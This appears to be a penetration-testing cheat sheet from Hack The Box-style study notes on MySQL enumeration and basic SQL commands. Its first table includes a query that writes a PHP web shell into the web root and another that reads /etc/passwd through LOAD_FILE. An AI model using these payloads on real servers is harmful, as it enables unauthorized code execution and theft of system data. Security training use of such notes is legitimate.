
## Footprinting

```sh
sudo nmap 10.129.14.128 -sV -sC -p3306 --script "mysql*"
```

---
## Commands

| Command                                                                                    | Description                                                                                                                                                |
| ------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mysql -u root -pPassw0 -h <FQDN/IP>`                                                      | Login to the MySQL server. Note: -p'password' without spaces                                                                                               |
| `show variables like "secure\_file\_priv";`                                                | Enumerate the secure file priv variable needed to enable reading/writing of files: NULL means no write permissions, FOLDERNAME means limited to the folder |
| `SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';` | Write local file (webshell)                                                                                                                                |
| `select LOAD\_FILE("/etc/passwd");`                                                        | Read local file                                                                                                                                            |
| `SELECT @@version`                                                                         | Fingerprint MySQL with query output                                                                                                                        |
| `SELECT SLEEP(5)`                                                                          | Fingerprint MySQL with no output                                                                                                                           |

***

## **MySQL Database Interaction**

- `information_schema` - provides access to database metadata
- `performance_schema` - Feature for monitoring MySQL Server execution at low lvl
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

| Command                                                           | Description                                              |
| ----------------------------------------------------------------- | -------------------------------------------------------- |
| mysql -u root -h docker.hackthebox.eu -P 3306 -p                  | login to mysql database                                  |
| SHOW DATABASES                                                    | List available databases                                 |
| USE users                                                         | Switch to database                                       |
| CREATE TABLE logins (id INT, ...)                                 | Add a new table                                          |
| SHOW TABLES                                                       | List available tables in current database                |
| DESCRIBE logins                                                   | Show table properties and columns                        |
| INSERT INTO table\_name VALUES (value\_1,..)                      | Add values to table                                      |
| INSERT INTO table\_name(column2, ...) VALUES (column2\_value, ..) | Add values to specific columns in a table                |
| UPDATE table\_name SET column1=newvalue1, ... WHERE               | Update table values                                      |
| SELECT \* FROM table\_name                                        | Show all columns in a table                              |
| SELECT column1, column2 FROM table\_name                          | Show specific columns in a table                         |
| DROP TABLE logins                                                 | Delete a table                                           |
| ALTER TABLE logins ADD newColumn INT                              | Add new column                                           |
| ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn           | Rename column                                            |
| ALTER TABLE logins MODIFY oldColumn DATE                          | Change column datatype                                   |
| ALTER TABLE logins DROP oldColumn                                 | Delete column                                            |
| SELECT \* FROM logins ORDER BY column\_1                          | Sort by column                                           |
| SELECT \* FROM logins ORDER BY column\_1 DESC                     | Sort by column in descending order                       |
| SELECT \* FROM logins ORDER BY column\_1 DESC, id ASC             | Sort by two-columns                                      |
| SELECT \* FROM logins LIMIT 2                                     | Only show first two results                              |
| SELECT \* FROM logins LIMIT 1, 2                                  | Only show first two results starting from index 2        |
| SELECT \* FROM table\_name WHERE                                  | List results that meet a condition                       |
| SELECT \* FROM logins WHERE username LIKE 'admin%'                | List results where the name is similar to a given string |

***
